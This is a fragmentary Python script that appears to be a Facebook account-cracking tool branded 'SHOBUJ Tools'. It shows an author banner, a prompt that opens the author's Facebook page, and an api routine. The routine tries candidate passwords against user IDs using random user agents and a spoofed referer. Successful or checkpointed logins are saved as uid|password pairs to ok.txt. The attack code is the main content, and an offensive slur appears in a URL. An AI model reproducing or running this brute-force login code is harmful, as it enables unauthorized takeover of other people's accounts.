#THE TOOL CREATED BY RAFSAN-VAU
#India Cyber Security Force 
#FB : https://www.facebook.com/madarchod.report.mar.tor.bap.Rafsan.c.e.o.I.c.s.f?'/)
#PAGE : Rafsan Vau
#Programer SHOBUJ 
...
╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : SHOBUJ RANA
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   :MOHAMMAD SHOBUJRANA
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : Rafsan-cyber-401
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/madarchod.report.mar.tor.bap.Rafsan.c.e.o.I.c.s.f/')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is SHOBUJ")
			print("")
			input("\n\033[1;32m   ENTER MY FACEBOOK PAGE NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By Md SHOBUJ Chowdhury ")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using SHOBUJTools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[SHOBUJ] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'referer': 'https://r.search.yahoo.com/_ylt=Awr1Tf1B_1hkoxQFag2kwyQ5;_ylu=Y29sbwMEcG9zAzEEdnRpZAMEc2VjA3Ny/RV=2/RE=1683582914/RO=10/RU=https%3a%2f%2fwww.facebook.com%2f/RK=2/RS=zsvICx3xIpLEbqJMJZD1bqYrHkw-',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [SHOBUJ] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[1;32m   [SHOBUJ] %s | %s\033[32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
